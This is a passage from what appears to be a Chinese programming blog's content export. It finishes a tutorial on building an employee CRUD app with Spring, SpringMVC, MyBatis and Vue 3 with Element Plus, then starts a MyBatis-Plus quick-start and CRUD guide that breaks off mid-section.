employeeService.deleteEmp(empId);\n        return Msg.success();\n    }\n    /**\n     * 批量删除员工\n     */\n    @RequestMapping(value = \"/batch_delete\", method = {RequestMethod.DELETE})\n    @ResponseBody\n    public Msg deleteBatchEmployees(@RequestBody Map<String, Object> empIds) {\n        List<Integer> Ids = (List<Integer>) empIds.get(\"empIds\");\n        employeeService.deleteBatchEmp(Ids);\n        return Msg.success();\n    }\n}\n```\n\n#### Mapper\n\n```java\npublic interface EmployeeMapper {\n\n\t\t......\n      \n    int deleteByPrimaryKey(Integer empId);\n\n    int deleteBatchByIds(List<Integer> empIds);\n}\n```\n\n```xml\n<delete id=\"deleteByPrimaryKey\" parameterType=\"java.lang.Integer\">\n  delete from tb_emp\n  where emp_id = #{empId,jdbcType=INTEGER}\n</delete>\n\n<delete id=\"deleteBatchByIds\" parameterType=\"java.util.List\">\n  DELETE FROM tb_emp WHERE emp_id IN\n  <foreach collection=\"list\" item=\"empId\" open=\"(\" close=\")\" separator=\",\">\n    #{empId}\n  </foreach>\n</delete>\n```\n\n## 三、前端实现\n\n### 1.项目构建\n\n#### 创建vue3项目\n\n```bash\n## 创建\nvue create ssm-crud-front\n## 启动\ncd ssm-crud-front\nnpm run serve\n```\n\n#### 引入相关依赖\n\n##### elemen-plus\n\n安装\n\n```bash\n## vue-cli安装\nvue add element-plus\n\n## npm安装\nnpm install element-plus --save\n```\n引入\n```javascript\n// main.js\n\nimport ElementPlus from 'element-plus'\nimport 'element-plus/dist/index.css'\nimport zhCn from 'element-plus/lib/locale/lang/zh-cn'//设置中文\n\nconst app = createApp(App)\napp.use(ElementPlus, {locale: zhCn}).mount('#app')\n```\n\n##### elemen-plus-icons\n\n安装\n\n```bash\nnpm install @element-plus/icons-vue -S\n```\n引入\n```javascript\n// main.js\n\n//全局导入\nimport * as ElementPlusIconsVue from '@element-plus/icons-vue'\n\nconst app = createApp(App)\nfor (const [key, component] of Object.entries(ElementPlusIconsVue)) {\n  app.component(key, component)\n}\n```\n\n##### axios\n\n```bash\nnpm install axios -S\n\nimport axios from 'axios' #哪里使用哪里导入\n```\n\n##### router\n\n安装\n\n```bash\n## vue-cli安装\nvue add router\n\n## npm安装\nnpm install vue-router -S\n```\n引入\n```javascript\n// main.js\n\nimport router from './router'\n\nconst app = createApp(App)\napp.use(router)\n```\n\n### 2.项目配置\n\n#### main.js\n\n```javascript\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport router from './router'//路由\nimport ElementPlus from 'element-plus'//element-plus\nimport 'element-plus/dist/index.css'//element-plus\nimport zhCn from 'element-plus/lib/locale/lang/zh-cn'//element-plus中文\nimport * as ElementPlusIconsVue from '@element-plus/icons-vue'//element-plus-icons\n\nconst app = createApp(App)\n\n//配置全局icon\nfor (const [key, component] of Object.entries(ElementPlusIconsVue)) {\n    app.component(key, component)\n  }\n\napp.use(router).use(ElementPlus, {locale: zhCn}).mount('#app')\n```\n\n#### vue.config.js\n\n```javascript\n//解决跨域问题\nconst { defineConfig } = require('@vue/cli-service')\nmodule.exports = defineConfig({\n  transpileDependencies: true,\n  devServer: {\n\t  open: true,  // npm run serve后自动打开页面\n\t  host: '0.0.0.0',  // 匹配本机IP地址(默认是0.0.0.0)\n\t  port: 8084, // 开发服务器运行端口号\n\t  proxy: {// 解决跨域问题\n\t\t  '/api': {\n\t\t\t  target: 'http://localhost:8080/', //后端接口域名\n\t\t\t  changeOrigin: true,             //是否跨域\n\t\t\t  ws: true,                       //是否代理 websockets\n\t\t\t  secure: false,                   //是否https接口\n\t\t\t  pathRewrite: {                  //路径重置\n\t\t\t\t  '^/api': ''\n\t\t\t  }\n\t\t  }\n\t  },\n  },\n})\n```\n\n#### router/index.js\n\n```javascript\nimport { createRouter, createWebHashHistory } from 'vue-router'\nimport CrudView from '../views/CrudView.vue'\nconst routes = [\n  {\n    path: '/',\n    name: 'home',\n    component: CrudView\n  },\n  {\n    path: '/about',\n    name: 'about',\n    // 懒加载\n    component: () => import(/* webpackChunkName: \"about\" */ '../views/AboutView.vue')\n  }\n]\n\nconst router = createRouter({\n  history: createWebHashHistory(),\n  routes\n})\n\nexport default router\n```\n\n### 3.页面构建\n\n#### 组件(components)\n\n##### Header\n\n```html\n<template>\n  <el-header class=\"header\">\n      <a href=\"/\" class=\"nav-link\">\n        <img class=\"nav-logo\" src=\"../assets/favicon.png\" alt=\"logo\"/>\n        <h2 class=\"nav-title\">SSM-VUE-CRUD</h2>\n      </a>\n    <el-button type=\"default\" size=\"default\" :plain=\"true\" @click=\"skipAbout()\">关于</el-button>\n  </el-header>\n</template>\n\n<script setup>\nimport { useRouter } from \"vue-router\";\nimport { ElMessage} from \"element-plus\";\n\n\n//关于页跳转\nconst router = useRouter();\nconst skipAbout = () => {\n  // window.location.href='#/about';\n  // router.push({path:'about'})\n  router.push({ name: \"about\" }); //路由名\n  //弹框提示\n  ElMessage({\n    showClose: true,\n    message: \"这是本项目的关于页面！\",\n    center: true,\n    type: \"success\",\n  });\n};\n</script>\n\n<style scoped>\n.header {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  width: 100%;\n  border-bottom: 1px solid #eee;\n  min-width: 800px;\n}\n.nav-logo {\n  height: 45px;\n  width: 45px;\n  vertical-align: middle;\n  display: inline-block;\n}\n.nav-title {\n  /* font-size: 2rem; */\n  display: inline-block;\n  vertical-align: middle;\n  color: #79bbff;\n  padding-top: 10px;\n}\n</style>\n```\n\n##### Footer\n\n```html\n<template>\n<el-footer class=\"footer\"> \n    <span>SSM-VUE-CRUD ©2022 Created by </span> \n    <a href=\"https://jwt1399.top\" style=\"text-decoration: none;color: #409eff;\"> jwt1399.top</a>\n </el-footer>\n</template>\n\n <style scoped>\n.footer {\n    /* 显示在底部*/\n    position: relative;\n    text-align: center; \n    width: 100%;\n    /* 垂直居中*/\n    height: 60px;\n    line-height:60px;\n    background-color: #fff;\n    border-top:1px solid #E7E7E7;\n} \n</style>\n```\n\n#### 页面(views)\n\n##### App\n\n```html\n<template>\n  <Header/>\n  <router-view/>\n  <Footer/>   \n</template>\n\n<script setup>\nimport Header from '@/components/Header.vue'\nimport Footer from '@/components/Footer.vue'\n</script>\n\n<style>\n#app {\n  font-family: Avenir, Helvetica, Arial, sans-serif;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n}\n</style>\n\n\n<!-- 不使用script setup语法糖 -->\n<!-- <script>\nimport Header from '@/components/Header.vue'\nimport Footer from '@/components/Footer.vue'\nexport default {\n    components: {\n        Header,\n        Footer,\n    }\n}\n</script> -->\n```\n\n##### AboutView\n\n```html\n<template>\n  <div class=\"about\">\n    <h2>基于SSM-VUE前后端分离的 CRUD 系统</h2>\n    <h3>前端</h3>\n      <p>开发框架：Vue3、Axios、Element Plus</p>\n      <p>脚手架：@Vue/cli</p>\n      <p>包管理: npm</p>\n      <p>开发工具：VSCode、Chrome</p>\n    <h3>后端</h3>\n      <p>开发框架：Spring、SpringMVC、Mybatis</p>\n      <p>数据库：MySQL</p>\n      <p>分页： pagehelper</p>\n      <p>逆向工程： Mybatis Generator</p>\n      <p>依赖管理： Maven</p>\n      <p>开发工具：IDEA 2022.1、Navicat 16</p>\n  </div>\n</template>\n\n<style scoped>\n.about{\n  text-align: center;\n}\n</style>\n```\n\n##### CrudView\n\n```html\n<template>\n  <el-main>\n    <!--员工列表-->\n    <div class=\"data-table\">\n      <el-table\n        :data=\"employeeList\"\n        border\n        style=\"width: 100%\"\n        v-loading=\"loading\"\n        @selection-change=\"handleSelectionChange\"\n      >\n        <el-table-column type=\"selection\"></el-table-column>\n        <el-table-column prop=\"empId\" label=\"id\" sortable></el-table-column>\n        <el-table-column prop=\"empName\" label=\"姓名\"></el-table-column>\n        <el-table-column prop=\"gender\" label=\"性别\" :formatter=\"formatterSex\"></el-table-column>\n        <el-table-column prop=\"email\" label=\"邮箱\"></el-table-column>\n        <el-table-column prop=\"department.deptName\" label=\"部门\"></el-table-column>\n        <!-- <el-table-column label=\"操作\"> -->\n        <el-table-column align=\"center\">\n          <template #header>\n            <el-button type=\"primary\" size=\"default\" @click=\"handleAdd()\">添加</el-button>\n            <el-button type=\"danger\" size=\"default\" @click=\"handleBatchDelete()\">删除</el-button>\n          </template>\n          <template #default=\"scope\">\n            <el-button\n              type=\"primary\"\n              size=\"large\"\n              :icon=\"Edit\"\n              @click=\"handleEdit(scope.$index, scope.row)\"\n              circle\n            >\n            </el-button>\n            <el-button\n              type=\"danger\"\n              size=\"large\"\n              :icon=\"Delete\"\n              @click=\"handleDelete(scope.$index, scope.row)\"\n              circle\n            >\n            </el-button>\n          </template>\n        </el-table-column>\n      </el-table>\n\n    </div>\n    <!--分页-->\n    <div class=\"table-pagination\">\n      <el-pagination\n        v-model:current-page=\"pageNum\"\n        v-model:page-size=\"pageSize\"\n        :page-sizes=\"[5, 10, 15, 20]\"\n        :small=\"small\"\n        :disabled=\"disabled\"\n        :background=\"background\"\n        layout=\"total, sizes, prev, pager, next, jumper\"\n        :total=\"total\"\n        @size-change=\"handleSizeChange\"\n        @current-change=\"handleCurrentChange\"\n      >\n      </el-pagination>\n    </div>\n  </el-main>\n\n  <!--修改/添加表单-->\n  <el-dialog\n    v-model=\"dialogFormVisible\"\n    :title=\"editNameDisabled ? '修改' : '添加'\"\n    @close=\"dialogClose\">\n    <el-form\n      :model=\"EmpForm\"\n      :rules=\"rules\"\n      ref=\"formRef\"\n      label-position=\"right\"\n      label-width=\"80px\"\n      status-icon>\n      <el-form-item label=\"姓名\" prop=\"empName\">\n        <el-input v-model=\"EmpForm.empName\" :disabled=\"editNameDisabled\"></el-input>\n      </el-form-item>\n      <el-form-item label=\"邮箱\" prop=\"email\">\n        <el-input v-model=\"EmpForm.email\"></el-input>\n      </el-form-item>\n      <el-form-item label=\"性别\" prop=\"gender\">\n        <el-radio-group v-model=\"EmpForm.gender\">\n          <el-radio :label=\"1\" border size=\"default\">男</el-radio>\n          <el-radio :label=\"2\" border size=\"default\">女</el-radio>\n        </el-radio-group>\n      </el-form-item>\n      <el-form-item label=\"所属部门\" prop=\"dId\">\n        <el-select v-model=\"EmpForm.dId\" placeholder=\"请选择部门\">\n            <el-option v-for=\"(item,index) in DeptList\" :key=\"index\" :label=\"item.deptName\" :value=\"item.deptId\"> \n            </el-option>\n        </el-select>\n      </el-form-item>\n    </el-form>\n    <template #footer>\n      <span class=\"dialog-footer\">\n        <el-button @click=\"resetForm\">取消</el-button>\n        <el-button @click=\"SubmitForm\" type=\"primary\" >确定</el-button>\n      </span>\n    </template>\n  </el-dialog>\n</template>\n\n<script setup>\nimport { ElMessage, ElMessageBox } from \"element-plus\";\nimport { ref, reactive } from \"vue\";\nimport { Search, Edit, Delete } from \"@element-plus/icons-vue\";\nimport axios from \"axios\";\n\n/**\n * 分页相关\n */\nconst pageNum = ref(1);\nconst pageSize = ref(10);\nconst small = ref(false);\nconst background = ref(true);\nconst disabled = ref(false);\nconst total = ref(null);\nconst handleSizeChange = (val) => {//每页条目数\n  console.log(`每页条目数：${val}`);\n  getEmployeeList(pageNum.value, val);\n};\nconst handleCurrentChange = (val) => {//当前页面\n  console.log(`当前页面: ${val}`);\n  getEmployeeList(val, pageSize.value);\n};\n\n/**\n * 员工增删改\n */\n// 新增按钮\nconst handleAdd = () => {\n    // getAllDept();\n    editNameDisabled.value = false;\n    dialogFormVisible.value = true;\n};\n//勾选框改变\nlet batchIds = [];\nconst handleSelectionChange = (val) => {\n  console.log(\"勾选的信息：\",val);\n  var arrs = [];\n  for (var i = 0; i < val.length; i++) {\n    arrs.push(val[i].empId);\n  }\n    batchIds = arrs;\n};\n// 批量删除按钮\nconst handleBatchDelete = () => {\n  ElMessageBox.confirm(\"此操作将永久删除这些信息, 是否继续?\", \"提示\", {\n    confirmButtonText: \"确定\",\n    cancelButtonText: \"取消\",\n    type: \"warning\",\n  })\n  .then(() => {\n    batchDeleteEmp(batchIds);\n  })\n  .catch(() => {\n    ElMessage({\n      type: \"info\",\n      message: \"删除取消\",\n    });\n  });\n};\n// 删除按钮\nconst handleDelete = (index, row) => {\n  console.log(index, row);\n  ElMessageBox.confirm(\"此操作将永久删除该信息, 是否继续?\", \"提示\", {\n    confirmButtonText: \"确定\",\n    cancelButtonText: \"取消\",\n    type: \"warning\",\n  })\n    .then(() => {\n      deleteEmployee(row.empId);\n    })\n    .catch(() => {\n      ElMessage({ type: \"info\", message: \"删除取消\" });\n    });\n};\n// 修改按钮\nconst handleEdit = (index, row) => {\n  console.log(index, row);\n  getEmployee(row.empId);\n  // getAllDept();\n  editNameDisabled.value = true;\n  dialogFormVisible.value = true;\n\n};\n\n/**\n * axios请求\n */\n// 查询单个员工信息\nconst EmpForm = ref({});//存储单个员工信息\nfunction getEmployee(empId) {\n  axios\n    .get(`api/ssm_crud_back/emp/${empId}`)\n    .then((response) => {\n        console.log(\"单个员工信息：\",response.data);\n        EmpForm.value = response.data.data.emp;\n        console.log(EmpForm);\n    })\n    .catch((error) => {\n        console.log(error);\n    });\n}\n//获取所有员工数据\nconst employeeList = ref([]); //员工列表\nconst loading = ref(true); //加载动画\nfunction getEmployeeList(pageNum, pageSize) {\n  axios.get(\"api/ssm_crud_back/employees/\", {\n      params: {\n        pageNum: pageNum,\n        pageSize: pageSize,\n      },\n    })\n    .then(function (res) {\n      console.log(\"所有员工信息：\" , res.data);\n      loading.value = false;\n      employeeList.value = res.data.data.pageInfo.list;\n      total.value = res.data.data.pageInfo.total;\n      pageSize = res.data.data.pageInfo.pageSize;\n      pageNum = res.data.data.pageInfo.pageNum;\n    })\n    .catch(function (error) {\n      console.log(error);\n    });\n}\n//性别格式化\nconst formatterSex = (row, column) => {\n  return row.gender == 1 ? \"男\" : \"女\";\n};\n//删除员工信息\nfunction deleteEmployee(empId) {\n  axios.delete(`api/ssm_crud_back/delete/${empId}`)\n    .then(res => {\n      if (res.data.code == 100) {\n        getEmployeeList(pageNum.value,pageSize.value);\n        ElMessage({ type: \"success\", message: \"删除成功\" });\n      } else {\n        ElMessage({ type: \"error\", message: \"删除失败\" });\n      }\n    })\n    .catch(error => {\n      console.log(error);\n    });\n}\n// 更新员工信息\nfunction updateEmployee(params) {\n  axios.put(\"api/ssm_crud_back/update\", {...params})\n    .then(res => {\n        console.log(res.data)\n      if (res.data.code == 100) {\n        ElMessage({ type: \"success\", message: \"更新成功\" });\n        getEmployeeList(pageNum.value,pageSize.value);\n      } else {\n        ElMessage({ type: \"error\", message: \"更新失败\" });\n      }\n    })\n    .catch(error => {\n      console.log(error);\n    });\n}\n//获取所有部门\nlet DeptList = ref({})//存储部门信息\nfunction getAllDept() {\n  axios.get(\"api/ssm_crud_back/dept\")\n  .then(res => {\n      console.log(\"部门信息：\",res.data);\n      DeptList.value = res.data.data.dept;\n  })\n  .catch(error => {\n    console.log(error);\n  });\n}\n//批量删除\nfunction batchDeleteEmp(empIds){\n    if (empIds.length == 0) {\n    ElMessage({\n      message: \"最少选择一位员工！\",\n      type: \"warning\",\n    });\n    return;\n  }\n  axios.delete(\"api/ssm_crud_back/batch_delete/\", {data: {empIds: empIds}})\n  .then(res => {\n    ElMessage({\n      type: \"success\",\n      message: \"删除成功\",\n    });\n    getEmployeeList(pageNum.value,pageSize.value);\n  })\n  .catch(error => {\n    ElMessage({\n      type: \"error\",\n      message: \"删除失败\",\n    });\n  });\n}\n//添加员工信息\nfunction addEmployee(params) {\n  axios.post(\"api/ssm_crud_back/add\", {...params})\n  .then(res => {\n    console.log(\"添加\",res.data)\n    if (res.data.code == 100) {\n        ElMessage({ type: \"success\", message: \"添加成功\" });\n        getEmployeeList(pageNum.value,pageSize.value);\n        return;\n    }\n    ElMessage({ type: \"error\", message: \"添加失败\" });\n  })\n  .catch(error => {\n    console.log(error);\n  })\n}\n\n/**\n * setup阶段执行函数\n */\n//调用获取所有部门\ngetAllDept()\n//调用获取所有员工\ngetEmployeeList(pageNum.value,pageSize.value);\n\n/**\n * 修改/添加对话框相关\n */\n//显示/隐藏对话框\nlet dialogFormVisible = ref(false);\n//名字是否可编辑\nlet editNameDisabled = ref(false);\n//获取表单dom元素\nlet formRef = ref(null);\n//对话框取消按钮\nfunction resetForm() {\n  formRef.value.resetFields();\n  dialogFormVisible.value = false;\n}\n//对话框关闭\nfunction dialogClose() {\n  formRef.value.resetFields();\n}\n//对话框确定按钮\nfunction SubmitForm() {\n  formRef.value.validate((valid) => {//表单验证\n    if (valid) {\n      if (editNameDisabled.value) {\n        updateEmployee(EmpForm.value);\n      } else {\n        addEmployee(EmpForm.value);\n      }\n      dialogFormVisible.value = false;\n    }\n  })\n}\n//对话框表单验证\nconst rules = reactive({\n  empName: [\n    {\n      required: true,\n      message: \"请输入姓名\",\n      trigger: \"blur\",\n    },\n    {\n      min: 1,\n      max: 15,\n      message: \"长度应该1 ～ 15\",\n      trigger: \"blur\",\n    },\n  ],\n  email: [\n    {\n      required: true,\n      message: \"请输入正确邮箱\",\n      trigger: \"blur\",\n      pattern: /^[A-Za-z0-9\\u4e00-\\u9fa5]+@[a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+$/,\n    },\n  ],\n  gender: [\n    {\n      required: true,\n      message: \"请选择性别\",\n      trigger: \"blur\",\n    },\n  ],\n  dId: [\n    {\n      required: true,\n      message: \"请选择部门\",\n      trigger: \"blur\",\n    },\n  ],\n  department: [\n    {\n      required: true,\n      message: \"请选择部门\",\n      trigger: \"blur\",\n    },\n  ],\n});\n</script>\n\n<style scoped>\n.table-pagination {\n  display: flex;\n  justify-content: center;\n  padding: 20px;\n}\n</style>\n```\n\n\n\n## 参考\n\n- [Vue SSM搭建一个简单的Demo前后端分离含增删改查(CRUD)、分页、批量功能](https://blog.csdn.net/jianyuwuyi/article/details/107924066)\n\n- [SSM实现CRUD（前后端分离）](https://blog.csdn.net/qq_41307110/article/details/123868778)\n\n- [SSM+VUE实现分页功能](https://mp.weixin.qq.com/s/dGAT5C9m0oANB38tVhTfKA)\n\n- [SSM + VUE 实现简单的 CRUD](https://www.cnblogs.com/l-y-h/p/12030104.html)\n- [SSM-CRUD SSM+VUE版本 (尚硅谷教程)](https://blog.csdn.net/weixin_45454773/article/details/122931487)\n- [SSM 框架整合案例 · 语雀 (yuque.com)](https://www.yuque.com/jyunkai/ssm/gumcba#JsHAE)\n\n\n\n\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["MyBatis","Spring","SpringMVC"],"categories":["Spring"]},{"title":"MyBatis-Plus","url":"/posts/11146.html","content":"\nMyBatis-Plus（简称 MP）是一个 MyBatis 的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。\n\n## 一、快速入门\n\n### 1.建库建表\n\n现有一张 `User` 表，其表结构如下：\n\n| id   | name   | age  | email              |\n| ---- | ------ | ---- | ------------------ |\n| 1    | Jone   | 18   | test1@baomidou.com |\n| 2    | Jack   | 20   | test2@baomidou.com |\n| 3    | Tom    | 28   | test3@baomidou.com |\n| 4    | Sandy  | 21   | test4@baomidou.com |\n| 5    | Billie | 24   | test5@baomidou.com |\n\n**a>创建库&表**\n\n```sql\nCREATE DATABASE `mybatis_plus`;\nuse `mybatis_plus`;\nDROP TABLE IF EXISTS user;\nCREATE TABLE user\n(\n\tid BIGINT(20) NOT NULL COMMENT '主键ID',\n\tname VARCHAR(30) NULL DEFAULT NULL COMMENT '姓名',\n\tage INT(11) NULL DEFAULT NULL COMMENT '年龄',\n\temail VARCHAR(50) NULL DEFAULT NULL COMMENT '邮箱',\n\tPRIMARY KEY (id)\n)ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\n**b>添加数据**\n\n```sql\nINSERT INTO user (id, name, age, email) VALUES\n(1, 'Jone', 18, 'test1@baomidou.com'),\n(2, 'Jack', 20, 'test2@baomidou.com'),\n(3, 'Tom', 28, 'test3@baomidou.com'),\n(4, 'Sandy', 21, 'test4@baomidou.com'),\n(5, 'Billie', 24, 'test5@baomidou.com');\n```\n\n------\n\n### 2.创建工程\n\n**a>使用`Spring Initializer`快速初始化一个 Spring Boot 工程**\n\n- 勾选 MySQL 驱动、Lombok\n\n**b>引入`MyBatis-Plus`的依赖**\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.5.1</version>\n</dependency>\n```\n\n### 3.编写代码\n\n**a>配置`application.yml`文件**\n\n```yaml\nspring:\n  #配置数据源\n  datasource:\n    #配置数据源类型\n    type: com.zaxxer.hikari.HikariDataSource\n    #配置连接数据库的信息\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/mybatis_plus?characterEncoding=utf-8&useSSL=false\n    username: root\n    password: root\n\n#MyBatis-Plus相关配置\nmybatis-plus:\n  configuration:\n    #配置日志\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl\n```\n\n**b>在 Spring Boot 启动类中添加 `@MapperScan` 注解，扫描 Mapper 文件夹**\n\n```java\n@SpringBootApplication\n@MapperScan(\"指定Mapper接口所在的包\")\npublic class MybatisPlusDemoApplication {\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(MybatisPlusDemoApplication.class, args);\n\t}\n}\n```\n\n**c>编写实体类 `User.java`（此处使用了 Lombok 简化代码）**\n\n```java\n@Data\npublic class User {\n    private Long id;\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n**d>编写 Mapper 包下的 `UserMapper`接口**\n\nBaseMapper是MyBatis-Plus提供的模板mapper，其中包含了基本的CRUD方法，泛型为操作的实体类型\n\n```java\npublic interface UserMapper extends BaseMapper<User> {}\n```\n\n### 4.测试查询\n\n**编写一个测试类`MyBatisPlusTest.java`**\n\n```java\n@SpringBootTest\npublic class MyBatisPlusTest {\n    @Autowired\n    private UserMapper userMapper;\n    /**\n     * 测试查询所有数据\n     */\n    @Test\n    void testSelectList(){\n        //通过条件构造器查询一个list集合，若没有条件，则可以设置null为参数\n        List<User> users = userMapper.selectList(null);\n        users.forEach(System.out::println);\n    }\n}\n```\n\n**控制台打印查询结果**\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\nUser(id=2, name=Jack, age=20, email=test2@baomidou.com)\nUser(id=3, name=Tom, age=28, email=test3@baomidou.com)\nUser(id=4, name=Sandy, age=21, email=test4@baomidou.com)\nUser(id=5, name=Billie, age=24, email=test5@baomidou.com)\n```\n\n## 二、基本CRUD\n\n### 1.Mapper CRUD 接口\n\n通用 CRUD 封装 `BaseMapper` 接口，为 `Mybatis-Plus` 启动时自动解析实体表关系映射转换为 `Mybatis` 内部对象注入容器，MyBatis-Plus 中内置的 BaseMapper 中都已得到了实现，因此我们继承该接口以后可以直接使用。\n\n```java\npublic interface UserMapper extends BaseMapper<User> {\n}\n```\n\n> **BaseMapper中提供的CRUD方法：**\n\n#### **增加：Insert**\n\n```java\n// 插入一条记录\nint insert(T entity);\n```\n\n#### **删除：Delete**\n\n```java\n// 根据 entity 条件，删除记录\nint delete(@Param(Constants.WRAPPER) Wrapper<T> wrapper);\n// 根据 ID 批量删除\nint deleteBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);\n// 根据 ID 删除\nint deleteById(Serializable id);\n// 根据 columnMap 条件，删除记录\nint deleteByMap(@Param(Constants.COLUMN_MAP) Map<String, Object> columnMap);\n```\n\n#### **修改：Update**\n\n```java\n// 根据 whereWrapper 条件，更新记录\nint update(@Param(Constants.ENTITY) T updateEntity, @Param(Constants.WRAPPER) Wrapper<T> whereWrapper);\n// 根据 ID 修改\nint updateById(@Param(Constants.ENTITY) T entity);\n```\n\n#### **查询：Selete**\n\n```java\n// 根据 ID 查询\nT selectById(Serializable id);\n// 根据 entity 条件，查询一条记录\nT selectOne(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n\n// 根据ID 批量查询\nList<T> selectBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);\n// 根据 entity 条件，查询全部记录\nList<T> selectList(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n// 查询（根据 columnMap 条件）\nList<T> selectByMap(@Param(Constants.COLUMN_MAP) Map<String, Object> columnMap);\n// 根据 Wrapper 条件，查询全部记录\nList<Map<String, Object>> selectMaps(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n// 根据 Wrapper 条件，查询全部记录。注意： 只返回第一个字段的值\nList<Object> selectObjs(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n\n// 根据 entity 条件，查询全部记录（并翻页）\nIPage<T> selectPage(IPage<T> page, @Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n// 根据 Wrapper 条件，查询全部记录（并翻页）\nIPage<Map<String, Object>> selectMapsPage(IPage<T> page, @Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n// 根据 Wrapper 条件，查询总记录数\nInteger selectCount(@Param(Constants.WRAPPER) Wrapper<T> queryWrapper);\n```\n\n### 2.调用Mapper实现CRUD\n\n```java\n@SpringBootTest\npublic class MyBatisPlusTest {\n    @Autowired\n    private UserMapper userMapper;\n  \n    @Test\n    public void testXXX(){\n      userMapper.xxxx();\n    }\n}\n```\n\n####  插入\n\n---\n\n> **最终执行的结果，所获取的id为1527206783590903810**\n>\n> **这是因为MyBatis-Plus在实现插入数据时，会默认基于雪花算法的策略生成id**\n\n```java\n/**\n  * 测试插入一条数据\n  * MyBatis-Plus在实现插入数据时，会默认基于雪花算法的策略生成id\n  */\n@Test\npublic void testInsert(){\n  User user = new User();\n  user.setName(\"jianjian\");\n  user.setAge(21);\n  user.setEmail(\"jianjian@123.com\");\n  int result = userMapper.insert(user);\n  System.out.println(result > 0 ? \"添加成功！\" : \"添加失败！\");\n  System.out.println(\"受影响的行数为：\" + result);\n  System.out.println(\"id自动获取：\" + user.getId());//当前 id 为雪花算法自动生成的id\n}\n```\n\n```\n添加成功！\n受影响的行数为：1\nid自动获取：1541252227434270722\n```\n\n####  删除\n\n---\n\n##### a、根据ID删除数据\n\n> **调用方法：int deleteById(Serializable id);**\n\n```java\n/**\n  * 测试根据id删除一条数据\n  */\n@Test\npublic void testDeleteById(){\n  int result = userMapper.deleteById(1541252227434270722L);\n  System.out.println(result > 0 ? \"删除成功！\" : \"删除失败！\");\n  System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n```\n删除成功！\n受影响的行数为：1\n```\n\n##### b、根据ID批量删除数据\n\n> **调用方法：int deleteBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);**\n\n```java\n/**\n  * 测试通过id批量删除数据\n  */\n@Test\npublic void testDeleteBatchIds(){\n  List<Long> ids = Arrays.asList(6L, 7L, 8L);\n  int result = userMapper.deleteBatchIds(ids);\n  System.out.println(result > 0 ? \"删除成功！\" : \"删除失败！\");\n  System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n```\n删除失败！\n受影响的行数为：0\n```\n\n##### c、根据Map条件删除数据\n\n> **调用方法：int deleteByMap(@Param(Constants.COLUMN_MAP) Map<String, Object> columnMap);**\n\n```java\n/**\n   * 测试根据Map集合中所设置的条件删除数据\n   */\n@Test\npublic void testDeleteByMap(){\n  //当前演示为根据name和age删除数据\n  //执行SQL为：DELETE FROM user WHERE name = ? AND age = ?\n  Map<String,Object> map = new HashMap<>();\n  map.put(\"name\",\"jianjian\");\n  map.put(\"age\",21);\n  int result = userMapper.deleteByMap(map);\n  System.out.println(result > 0 ? \"删除成功！\" : \"删除失败！\");\n  System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n#### 修改\n\n> **调用方法：int updateById(@Param(Constants.ENTITY) T entity);**\n\n```java\n/**\n  * 测试根据id修改用户信息\n  */\n@Test\npublic void testUpdateById(){\n  //执行SQL为： UPDATE user SET name=?, age=?, email=? WHERE id=?\n  User user = new User();\n  user.setId(6L);\n  user.setName(\"jianjian\");\n  user.setAge(18);\n  user.setEmail(\"jianjian@123.com\");\n  int result = userMapper.updateById(user);\n  System.out.println(result > 0 ? \"修改成功！\" : \"修改失败！\");\n  System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n#### 查询\n\n---\n\n##### a、根据ID查询用户信息\n\n> **调用方法：T selectById(Serializable id);**\n\n```java\n/**\n  * 测试根据id查询用户数据\n  */\n@Test\npublic void testSelectById(){\n  User user = userMapper.selectById(1L);\n  System.out.println(user);\n}\n```\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\n```\n\n##### b、根据多个ID查询多个用户信息\n\n> **调用方法：List\\<T> selectBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);**\n\n```java\n/**\n  * 根据多个id查询用户数据\n  */\n@Test\npublic void testSelectBatchIds(){\n  //执行SQL为：SELECT id,name,age,email FROM user WHERE id IN ( ? , ? , ? )\n  List<Long> ids = Arrays.asList(1L,2L,3L);\n  List<User> users = userMapper.selectBatchIds(ids);\n  users.forEach(System.out::println);\n}\n```\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\nUser(id=2, name=Jack, age=20, email=test2@baomidou.com)\nUser(id=3, name=Tom, age=28, email=test3@baomidou.com)\n```\n\n##### c、根据Map条件查询用户信息\n\n> 